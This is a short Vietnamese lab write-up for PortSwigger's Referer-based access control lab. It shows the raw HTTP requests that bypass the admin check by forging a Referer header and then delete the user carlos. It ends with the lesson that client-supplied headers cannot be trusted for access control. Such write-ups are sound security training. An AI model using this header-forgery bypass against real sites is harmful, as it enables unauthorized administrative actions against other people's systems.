![[idor-referer.png]]
-mô tả lab: trang admin check `Referer` phải chứa `/admin`. Mình giả Referer là qua.

> [!NOTE]
> -Lab: https://portswigger.net/web-security/access-control/lab-referer-based-access-control
> -test bằng `wiener:peter`

### hướng giải
- [ ] mình GET `/admin` thẳng thì `401 Unauthorized`
- [ ] mình thử thêm `Referer: https://LAB-ID.web-security-academy.net/admin`, sau đó quan sát gói tin trả về, mình thấy `200` admin panel hiện ra
- [ ] => server check Referer header do client gửi. Mình giả được header này trong Repeater/Burp thoải mái (victim thật thì dụ click từ trang /admin, nhưng lab chỉ cần mình tự gửi request là solve)

### giải
```
GET /admin HTTP/1.1
Cookie: session=SESSION_WIENER
Referer: https://LAB-ID.web-security-academy.net/admin
-> 200 admin panel
GET /admin/delete?username=carlos
Referer: https://LAB-ID.web-security-academy.net/admin
-> 302
```
![[idor-referer-200.png]]
-> carlos bay màu là solve.

> [!NOTE]
> -bài học của mình: Referer là header client tự khai, không bao giờ dùng làm access control. Kẻ tấn công tự gửi header gì cũng được.
